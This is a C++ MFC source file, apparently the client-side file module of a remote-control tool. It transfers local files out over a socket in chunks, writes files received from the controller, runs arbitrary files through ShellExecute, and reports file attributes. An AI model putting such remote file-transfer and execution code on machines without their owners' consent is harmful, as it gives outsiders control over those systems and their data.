#include "StdAfx.h"
#include "FileInfo.h"

CFileInfo::CFileInfo(void)
{
}

CFileInfo::~CFileInfo(void)
{
}

void CFileInfo::SendDownFileInfo( IN wchar_t* pPath, IN SOCKET sock )
{
	const int nBufSize = 512;  //文件块大小
	MSGINFO_S tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
	tagMsgInfo.Msg_id = CMD_DOWNLOAD;    //文件下载
    DOWNFILEDATA_S tagDownFileData;
	memset(&tagDownFileData, 0, sizeof(DOWNFILEDATA_S));

	CFile file(pPath, CFile::modeRead);
	ULONGLONG ullSize = file.GetLength();  //文件大小
	bool bSuccess = true;
	tagDownFileData.bFlag = false;
	if (ullSize < nBufSize) //文件不足一个块
	{
		file.Read((char*)tagDownFileData.context, (UINT)ullSize);
		tagDownFileData.size = (UINT)ullSize;
		tagDownFileData.nCount = 0;
		memcpy((char*)tagMsgInfo.context, (char*)&tagDownFileData, sizeof(DOWNFILEDATA_S));
		m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
	} 
	else  //分块发送
	{
		ULONGLONG ullCount = ullSize / nBufSize + 1;   //传送的次数
		int ullLastSize = ullSize % nBufSize;  //最后一次传输的字节数
		for (int i = 0; i < ullCount; i++)
		{
			memset(tagDownFileData.context, 0, sizeof(tagDownFileData.context));
			if ( i == ullCount - 1)  //最后一次传输文件
			{
				file.Read(tagDownFileData.context, ullLastSize);
				tagDownFileData.size = ullLastSize;
			}
			else
			{
				file.Read(tagDownFileData.context, nBufSize);
				tagDownFileData.size = nBufSize;
			}
			tagDownFileData.nCount = i;
			memcpy((char*)tagMsgInfo.context, (char*)&tagDownFileData, sizeof(DOWNFILEDATA_S));
			m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
		}
	}
	tagDownFileData.bFlag = true;  //文件传输完毕
	memcpy((char*)tagMsgInfo.context, (char*)&tagDownFileData, sizeof(DOWNFILEDATA_S));
	m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
}

void CFileInfo::CreateUpLoadFile( IN wchar_t* pPath)
{
	MSGINFO_S tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
	tagMsgInfo.Msg_id = CMD_UPLOAD;       //文件上传
	m_hFile = CreateFile(pPath,
		                 GENERIC_WRITE | GENERIC_READ,
						 FILE_SHARE_READ | FILE_SHARE_WRITE,
						 NULL, CREATE_ALWAYS,
						 FILE_ATTRIBUTE_NORMAL,
						 NULL);
	if (INVALID_HANDLE_VALUE == m_hFile)
	{
		printf("Create File Failed !\n");
	}
	else
	{
		printf("Create File Success !\n");
	}
}

void CFileInfo::WriteDataInFile( IN DOWNFILEDATA_S tagDownFileDate )
{
	CFile file(m_hFile);
	if (false == tagDownFileDate.bFlag)
	{
		file.Write((char*)tagDownFileDate.context, tagDownFileDate.size);  //写入文件
	}
	else
	{
		file.Close();
		CloseHandle(m_hFile);
	}
}

void CFileInfo::ExecuteFile(IN wchar_t* pFilePath, IN SOCKET sock)
{
	FILEEXECINFO_S tagFileExec;
	memset(&tagFileExec, 0, sizeof(FILEEXECINFO_S));
	MSGINFO_S tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
	tagMsgInfo.Msg_id = CMD_FILEEXEC;  //文件执行
	HINSTANCE hExecRet = ::ShellExecute(NULL, _T("open"), pFilePath, NULL, NULL, SW_SHOWNORMAL);
	if ((DWORD)hExecRet > 32)
	{
		tagFileExec.bSuccess = true;
	}
	else
	{
		tagFileExec.bSuccess = false;
	}
	wsprintfW(tagFileExec.szFilePath, pFilePath);
	memcpy((char*)tagMsgInfo.context, (char*)&tagFileExec, sizeof(FILEEXECINFO_S));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
}

void CFileInfo::SendAttriInfo( IN ATTRIBUTE_S tagAttribute, IN SOCKET sock )
{
	ATTRIBUTE_S tagArrti;
	memset(&tagArrti, 0, sizeof(ATTRIBUTE_S));
	tagArrti.nType      = tagAttribute.nType;    //类型
    wcscpy_s(tagArrti.szFilePath, tagAttribute.szFilePath);   //文件所在路径
	wcscpy_s(tagArrti.szFileName, tagAttribute.szFileName);  //文件的名称
 
	CString strFilePath = _T("");
	strFilePath.Format(_T("%s"), tagAttribute.szFilePath);
	CString strFileName = _T("");
	strFileName.Format(_T("%s"), tagAttribute.szFileName);
	strFilePath += strFileName;    //C:\windows\test(.txt)
	HANDLE hDir = CreateFile(strFilePath, 
		                      GENERIC_READ, 
		                      FILE_SHARE_READ|FILE_SHARE_WRITE,
							  NULL,
							  OPEN_EXISTING,
							  NULL, 
							  NULL);
	if (INVALID_HANDLE_VALUE != hDir)
	{
		FILETIME lpCreationTime; // 文件夹的创建时间
		FILETIME lpLastAccessTime; // 对文件夹的最近访问时间
		FILETIME lpLastWriteTime; // 文件夹的最近修改时间
		if (GetFileTime(hDir, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime))
		{
			FILETIME ftime;
			FileTimeToLocalFileTime(&lpCreationTime, &ftime); // 转换成本地时间
			FileTimeToSystemTime(&ftime, &tagArrti.sysCreateTime); // 转换成系统时间格式

			FileTimeToLocalFileTime(&lpLastAccessTime, &ftime);    //访问时间
			FileTimeToSystemTime(&ftime, &tagArrti.sysVisitTime);

			FileTimeToLocalFileTime(&lpLastWriteTime, &ftime);   //最近修改事件
			FileTimeToSystemTime(&ftime, &tagArrti.sysModifyTime);
		}
	}
	CloseHandle(hDir);
	if (FILE_ATTR == tagArrti.nType)  //文件
	{
		CFileStatus rStatus;
		if(CFile::GetStatus(strFilePath,rStatus))
		{
			//判断是否只读
			if((rStatus.m_attribute & 0x01) == 0x01)
			{
				tagArrti.bReadOnly = true;
			}
			else
			{
				tagArrti.bReadOnly = false;
			}
			//判断是否隐藏
			if((rStatus.m_attribute & 0x02) == 0x02)
			{
				tagArrti.bHide = true;
			}
			else
			{
				tagArrti.bHide = false;
			}
			//判断是否存档
			if((rStatus.m_attribute & 0x20) == 0x20)
			{
				tagArrti.bArchive = true;
			}
			else
			{
				tagArrti.bArchive = false;
			}
			//判断是否是系统文件
			if((rStatus.m_attribute & 0x04) == 0x04)
			{
				tagArrti.bSystem = true;
			}
			else
			{
				tagArrti.bSystem =false;
			}
		}
	}
	else if (FOLDER_ATTR == tagArrti.nType)  //文件夹(暂时还不能找到合适的方法获取文件夹的属性)
	{
		tagArrti.bArchive = false;
		tagArrti.bReadOnly = false;
		tagArrti.bHide = false;
		tagArrti.bSystem = false;
	}

	MSGINFO_S tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
	tagMsgInfo.Msg_id = CMD_ATTRIBUTE;
	memcpy((char*)tagMsgInfo.context, (char*)&tagArrti, sizeof(ATTRIBUTE_S));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
}